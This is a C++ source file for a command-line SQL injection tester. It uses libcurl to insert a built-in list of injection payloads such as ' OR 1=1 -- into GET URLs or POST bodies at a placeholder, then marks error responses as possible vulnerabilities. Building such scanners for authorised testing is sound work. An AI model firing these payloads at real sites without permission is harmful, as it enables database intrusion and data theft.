#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <curl/curl.h>
#include <iomanip>

std::vector<std::string> payloads = {
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 ({",
    "' OR 1=1 /*",
    "' OR 1=1 #",
    "' OR ''='",
    "' = '",
    "' OR 'a'='a",
    "' OR ''=' --",
};

std::string red_background(const std::string& text) {
    return "\033[41m" + text + "\033[0m";
}

std::string green_background(const std::string& text) {
    return "\033[42m" + text + "\033[0m";
}

ssize_t WriteCallback(void* contents, ssize_t size, ssize_t nmemb, void* userp) {
    static_cast<std::string *>(userp)->append(static_cast<char *>(contents), size * nmemb);
    return size * nmemb;
}

std::string replace_all(std::string str, const std::string& from, const std::string& to) {
    ssize_t start_pos = 0;
    while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length();
    }
    return str;
}

struct TestResult {
    std::string url;
    std::string method;
    std::string body;
    std::string status;
    std::string details;
};

bool is_json(const std::string& str) {
    return str.find('{') != std::string::npos && str.find('}') != std::string::npos;
}

void test_sql_injection_get(const std::string& url, std::vector<TestResult>& results) {
    long response_code;

    if(CURL *curl = curl_easy_init()) {
        for(const auto& payload : payloads) {
            std::string test_url = replace_all(url, "[test]", curl_easy_escape(curl, payload.c_str(), payload.length()));
            std::string readBuffer;

            curl_easy_setopt(curl, CURLOPT_URL, test_url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

            const CURLcode res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            TestResult result = {test_url, "GET", "", "", ""};

            if(res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
                continue;
            }

            if(response_code >= 500 || readBuffer.find("syntax error") != std::string::npos ||
               readBuffer.find("sql") != std::string::npos) {
                result.status = "DANGER";
                result.details = "possible sql injection found: " + test_url;
                std::cout << red_background(result.status) << " - " << result.details << std::endl;
            } else {
                result.status = "PASS";
                result.details = "no vulnerability detected for: " + test_url;
                std::cout << green_background(result.status) << " - " << result.details << std::endl;
            }

            results.push_back(result);
        }
        curl_easy_cleanup(curl);
    }
}

void test_sql_injection_post(const std::string& url, const std::string& body, std::vector<TestResult>& results) {
    long response_code;

    if(CURL *curl = curl_easy_init()) {
        const bool json_body = is_json(body);
        for(const auto& payload : payloads) {
            std::string test_body = replace_all(body, "[test]", payload);
            std::string readBuffer;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, test_body.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

            if (json_body) {
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/json"));
            } else {
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/x-www-form-urlencoded"));
            }

            const CURLcode res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

            TestResult result = {url, "POST", test_body, "", ""};

            if(res != CURLE_OK) {
                std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
                continue;
            }

            if(response_code >= 500 || readBuffer.find("syntax error") != std::string::npos ||
               readBuffer.find("sql") != std::string::npos) {
                result.status = "DANGER";
                result.details = "possible sql injection found: " + url + " with payload: " + payload + " and body: " + test_body;
                std::cout << red_background(result.status) << " - " << result.details << std::endl;
            } else {
                result.status = "PASS";
                result.details = "no vulnerability detected for: " + url + " with payload: " + payload + " and body: " + test_body;
                std::cout << green_background(result.status) << " - " << result.details << std::endl;
            }

            results.push_back(result);
        }
        curl_easy_cleanup(curl);
    }
}

std::vector<std::tuple<std::string, std::string, std::string>> read_urls_from_csv(const std::string& filename) {
    std::vector<std::tuple<std::string, std::string, std::string>> urls;

    if (std::ifstream file(filename); file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            std::stringstream ss(line);
            std::string method, body;

            if (std::string url; std::getline(ss, url, '|') && std::getline(ss, method, '|') && std::getline(ss, body)) {
                urls.emplace_back(url, method, body);
            }
        }
        file.close();
    } else {
        std::cerr << "could not open file: " << filename << std::endl;
    }

    return urls;
}

void write_results_to_csv(const std::string& filename, const std::vector<TestResult>& results) {
    if (std::ofstream file(filename); file.is_open()) {
        file << "url,method,body,status,details\n";
        for (const auto&[url, method, body, status, details] : results) {
            file << status << "," << url << "," << method << "," << body << "," << details << "\n";
        }
        file.close();
    } else {
        std::cerr << "could not open file for writing: " << filename << std::endl;
    }
}

void load_additional_payloads(const std::string& filename) {
    if (std::ifstream file(filename); file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty()) {
                payloads.push_back(line);
            }
        }
        file.close();
    } else {
        std::cerr << "could not open payload file: " << filename << std::endl;
    }
}

int main(const int argc, char** argv) {
    if (argc < 2) {
        std::cerr <<  std::endl << "SQL Injection Tester" << std::endl << std::endl;
        std::cerr << "usage: " << argv[0] << " --csv <csv_file> --method <GET|POST> --body <body> [--payloads <payload_file>]" << std::endl;
        std::cerr << "or: " << argv[0] << " --url <url> --method <GET|POST> --body <body> [--payloads <payload_file>]" << std::endl << std::endl;
        std::cerr << std::endl << "options:" << std::endl << std::endl;
        std::cerr << "    --csv <csv_file>    : csv file with urls to test" << std::endl;
        std::cerr << "    --method <GET|POST> : method to use for testing" << std::endl;
        std::cerr << "    --body <body>       : body to use for POST requests" << std::endl;
        std::cerr << "    --payloads <payload_file> : file with additional payloads" << std::endl << std::endl;
        std::cerr << "example:" << std::endl << std::endl;
        std::cerr << "    " << argv[0] << " --csv urls.csv --method GET" << std::endl;
        std::cerr << "    " << argv[0] << R"( --url http://localhost:8080/api/v1/users --method POST --body '{"username":"[test]","password":"[test]"}')" << std::endl << std::endl;
        std::cerr << "Important: make sure to use [test] as a placeholder for the payload in the url or body" << std::endl << std::endl;

        std::cerr << "credits:" << std::endl;
        std::cerr << "    - Ciphers Systems, https://ciphers.systems" << std::endl;
        return 1;
    }

    std::string csv_file, method, body;
    std::vector<TestResult> results;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--csv" && i + 1 < argc) {
            csv_file = argv[i + 1];
        } else if (arg == "--method" && i + 1 < argc) {
            method = argv[i + 1];
        } else if (arg == "--body" && i + 1 < argc) {
            body = argv[i + 1];
        } else if (arg == "--payloads" && i + 1 < argc) {
            std::string payload_file = argv[i + 1];
            load_additional_payloads(payload_file);
        }
    }

    if (!csv_file.empty()) {
        std::vector<std::tuple<std::string, std::string, std::string> > urls = read_urls_from_csv(csv_file);
        for (const auto& [url, method_in_csv, body_in_csv] : urls) {
            if (method_in_csv == "GET") {
                test_sql_injection_get(url, results);
            } else if (method_in_csv == "POST") {
                test_sql_injection_post(url, body_in_csv, results);
            } else {
                std::cerr << "unsupported method: " << method_in_csv << std::endl;
            }
        }
        write_results_to_csv("/tmp/sql_injection_test_results.csv", results);
        std::cout << "results written to /tmp/sql_injection_test_results.csv" << std::endl;
    } else if (!method.empty()) {
        std::string url;
        for (int i = 1; i < argc; i += 2) {
            if (std::string arg = argv[i]; arg == "--url") {
                url = argv[i + 1];
            }
        }
        if (method == "GET") {
            test_sql_injection_get(url, results);
        } else if (method == "POST") {
            test_sql_injection_post(url, body, results);
        } else {
            std::cerr << "unsupported method: " << method << std::endl;
        }
    } else {
        std::cerr << "usage: " << argv[0] << " --csv <csv_file> --method <GET|POST> --body <body> [--payloads <payload_file>]" << std::endl;
        return 1;
    }

    return 0;
}
